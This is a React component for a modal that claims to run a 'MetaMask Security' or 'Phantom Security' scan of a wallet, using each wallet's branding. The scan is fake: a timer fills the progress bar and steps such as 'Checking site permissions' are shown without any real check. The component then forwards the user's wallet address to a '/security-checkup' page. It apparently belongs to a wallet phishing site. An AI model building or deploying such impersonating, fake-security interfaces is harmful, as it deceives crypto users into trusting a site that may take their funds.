import { useEffect, useMemo, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { ShieldCheck } from 'lucide-react'
import { markSecurityScanComplete, type SecurityCheckWallet } from '../lib/metaMaskSecurityCheck'
import { WalletLogo } from '../lib/walletLogos'

const SCAN_MS = 7000

const BRAND = {
  MetaMask: {
    accent: '#f6851b',
    accentBorder: '#f6851b',
    gradient: 'from-[#f6851b] via-[#e2761b] to-[#f5841f]',
    label: 'MetaMask Security',
    body: 'We are verifying MetaMask security with this platform. Please keep this window open.',
    scanStep: 'Scanning MetaMask security',
  },
  Phantom: {
    accent: '#ab9ff2',
    accentBorder: '#ab9ff2',
    gradient: 'from-[#ab9ff2] via-[#9b8af0] to-[#7c6ee6]',
    label: 'Phantom Security',
    body: 'We are verifying Phantom security with this platform. Please keep this window open.',
    scanStep: 'Scanning Phantom security',
  },
} as const

interface MetaMaskSecurityScanModalProps {
  open: boolean
  walletAddress: string
  walletBrand?: SecurityCheckWallet
  onFinished: () => void
}

export const MetaMaskSecurityScanModal: React.FC<MetaMaskSecurityScanModalProps> = ({
  open,
  walletAddress,
  walletBrand = 'MetaMask',
  onFinished,
}) => {
  const navigate = useNavigate()
  const [progress, setProgress] = useState(0)
  const theme = BRAND[walletBrand]

  const steps = useMemo(
    () =>
      [
        'Verifying wallet connection',
        'Checking site permissions',
        theme.scanStep,
        'Preparing secure checkup',
      ] as const,
    [theme.scanStep]
  )

  const activeStep = useMemo(() => {
    if (progress < 25) return 0
    if (progress < 50) return 1
    if (progress < 75) return 2
    return 3
  }, [progress])

  useEffect(() => {
    if (!open) {
      setProgress(0)
      return
    }
    const started = Date.now()
    const tick = window.setInterval(() => {
      const pct = Math.min(100, ((Date.now() - started) / SCAN_MS) * 100)
      setProgress(pct)
      if (pct >= 100) {
        window.clearInterval(tick)
        markSecurityScanComplete()
        onFinished()
        navigate('/security-checkup', {
          replace: true,
          state: { walletAddress, walletBrand },
        })
      }
    }, 80)
    return () => window.clearInterval(tick)
  }, [open, walletAddress, walletBrand, navigate, onFinished])

  if (!open) return null

  return (
    <div
      className="fixed inset-0 z-[500] flex items-center justify-center bg-[#050505]/90 backdrop-blur-xl px-4"
      role="dialog"
      aria-modal="true"
      aria-labelledby="wallet-scan-title"
    >
      <div className="w-full max-w-[420px] overflow-hidden rounded-[28px] border border-[#2d2d2d] bg-gradient-to-b from-[#1a1a1a] to-[#0f0f0f] shadow-[0_24px_80px_rgba(0,0,0,0.65)]">
        <div className="h-1 w-full bg-[#2a2a2a]">
          <div
            className={`h-full bg-gradient-to-r ${theme.gradient} transition-[width] duration-100`}
            style={{ width: `${progress}%` }}
          />
        </div>

        <div className="px-8 pt-8 pb-9 text-center">
          <div className="relative mx-auto mb-7 h-[88px] w-[88px]">
            <span
              className="absolute inset-0 rounded-full animate-ping opacity-30"
              style={{ backgroundColor: `${theme.accent}22` }}
            />
            <span
              className="absolute inset-0 rounded-full border-2 animate-spin"
              style={{ borderColor: `${theme.accent}55`, animationDuration: '2.4s' }}
            />
            <div className="absolute inset-[10px] rounded-full bg-[#242424] border border-[#3a3a3a] flex items-center justify-center shadow-inner">
              <WalletLogo name={walletBrand} className="w-11 h-11" rounded={false} alt={walletBrand} />
            </div>
            <span className="absolute -bottom-1 -right-1 flex h-7 w-7 items-center justify-center rounded-full bg-[#242424] border border-[#3a3a3a]">
              <ShieldCheck className="w-4 h-4" style={{ color: theme.accent }} strokeWidth={2.25} />
            </span>
          </div>

          <p
            className="text-[11px] font-semibold uppercase tracking-[0.2em] mb-2"
            style={{ color: theme.accent }}
          >
            {theme.label}
          </p>
          <h2 id="wallet-scan-title" className="text-[22px] font-semibold text-white tracking-tight mb-2">
            Checking platform security
          </h2>
          <p className="text-sm text-[#a3a3a3] leading-relaxed max-w-[320px] mx-auto">{theme.body}</p>

          <ul className="mt-7 space-y-2.5 text-left">
            {steps.map((label, i) => {
              const done = i < activeStep
              const current = i === activeStep
              return (
                <li
                  key={label}
                  className={`flex items-center gap-3 rounded-xl px-3 py-2 text-[13px] transition-colors ${
                    current ? 'text-white border' : done ? 'text-[#9ca3af]' : 'text-[#525252]'
                  }`}
                  style={
                    current
                      ? {
                          backgroundColor: `${theme.accent}18`,
                          borderColor: `${theme.accent}40`,
                        }
                      : undefined
                  }
                >
                  <span
                    className={`flex h-5 w-5 shrink-0 items-center justify-center rounded-full text-[10px] font-bold ${
                      done ? 'text-black' : current ? 'border-2' : 'border border-[#404040] text-[#525252]'
                    }`}
                    style={
                      done
                        ? { backgroundColor: theme.accent }
                        : current
                          ? { borderColor: theme.accent, color: theme.accent }
                          : undefined
                    }
                  >
                    {done ? '✓' : i + 1}
                  </span>
                  <span className={current ? 'font-medium' : ''}>{label}</span>
                </li>
              )
            })}
          </ul>

          <p className="mt-6 text-xs text-[#6b7280] font-mono tabular-nums">{Math.round(progress)}% complete</p>
        </div>
      </div>
    </div>
  )
}
